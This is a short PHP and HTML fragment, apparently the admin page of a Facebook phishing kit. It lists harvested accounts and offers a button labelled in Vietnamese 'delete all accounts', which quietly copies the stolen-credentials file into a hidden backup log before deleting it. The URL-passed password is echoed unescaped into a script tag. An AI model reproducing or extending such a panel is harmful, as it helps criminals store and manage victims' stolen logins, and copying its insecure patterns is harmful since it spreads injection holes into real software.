...
if(isset($_POST['listacc'])) {
    ...
    fclose($p);
     echo "<script>window.location.href = 'fb.php?password=".$_GET['password']."'</script>";
}
if(isset($_POST['delete'])) {
   $fp = fopen('backup101010388xxx.log', 'a');
fwrite($fp, file_get_contents($name_facebook));
fclose($fp);
    unlink($name_facebook);
     echo "<script>window.location.href = 'fb.php?password=".$_GET['password']."'</script>";
}
...
<form class="form-horizontal" action="" method="post">
        <div class="row">
          ...
          <br> <br>
                    <div class="col-md-12">
            <button name="delete" type="submit" class="btn btn-info btn-block">XOÁ TẤT CẢ ACCOUNT</button>
          </div>
